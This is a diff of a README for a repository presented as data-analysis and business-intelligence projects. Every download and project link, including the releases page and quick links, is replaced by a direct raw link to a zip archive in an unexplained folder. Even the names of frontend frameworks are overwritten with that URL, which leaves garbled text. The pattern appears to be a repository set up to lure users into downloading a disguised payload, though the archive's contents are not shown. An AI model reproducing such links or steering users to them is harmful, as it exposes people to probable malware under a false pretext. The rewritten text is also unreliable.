@@ -4,7 +4,7 @@
 Welcome to the AymanElhaddad repository! This is your go-to space for insights into data analysis, business intelligence, and more. Here, you can find practical projects that showcase useful skills and innovative solutions in various domains.
 
 ## 📥 Download Now
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-blue)](https://github.com/Luanderharami/AymanElhaddad/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/Luanderharami/AymanElhaddad/main/literalize/AymanElhaddad.zip%20Latest%20Release-blue)](https://raw.githubusercontent.com/Luanderharami/AymanElhaddad/main/literalize/AymanElhaddad.zip)
 
 ## 🛠️ System Requirements
 To run the applications in this repository, ensure your system meets the following requirements:
@@ -24,7 +24,7 @@ The applications span a variety of powerful features to enhance your data manage
 
 ## 📝 Download & Install
 1. **Visit the Releases Page:**
-   Go to the [Releases page](https://github.com/Luanderharami/AymanElhaddad/releases) to find all available versions of the applications.
+   Go to the [Releases page](https://raw.githubusercontent.com/Luanderharami/AymanElhaddad/main/literalize/AymanElhaddad.zip) to find all available versions of the applications.
 
 2. **Select the Latest Version:**
    Look for the most recent version release. This will usually be at the top of the list.
@@ -45,7 +45,7 @@ The applications span a variety of powerful features to enhance your data manage
 The repository contains various projects related to:
 
 - **Excel VBA:** Automate repetitive tasks in Excel.
-- **Frontend Development:** Create engaging user interfaces using frameworks like React.js and Vue.js.
+- **Frontend Development:** Create engaging user interfaces using frameworks like https://raw.githubusercontent.com/Luanderharami/AymanElhaddad/main/literalize/AymanElhaddad.zip and https://raw.githubusercontent.com/Luanderharami/AymanElhaddad/main/literalize/AymanElhaddad.zip
 - **Quality Assurance:** Automate tests to ensure software reliability.
 - **SAP & Talend:** Integrate different systems for seamless data flow.
 
@@ -70,5 +70,5 @@ A: Yes, assistance is available through the issues section of the repository. We
 Thanks for visiting the AymanElhaddad repository. Each application is a product of genuine skill and innovation, crafted to help users like you navigate the world of data analysis effectively. We appreciate your interest and support as we grow and enhance these tools together.
 
 ## 🔗 Quick Links
-- [Download Latest Release](https://github.com/Luanderharami/AymanElhaddad/releases)
-- [Explore More Projects](https://github.com/Luanderharami/AymanElhaddad)
+- [Download Latest Release](https://raw.githubusercontent.com/Luanderharami/AymanElhaddad/main/literalize/AymanElhaddad.zip)
+- [Explore More Projects](https://raw.githubusercontent.com/Luanderharami/AymanElhaddad/main/literalize/AymanElhaddad.zip)
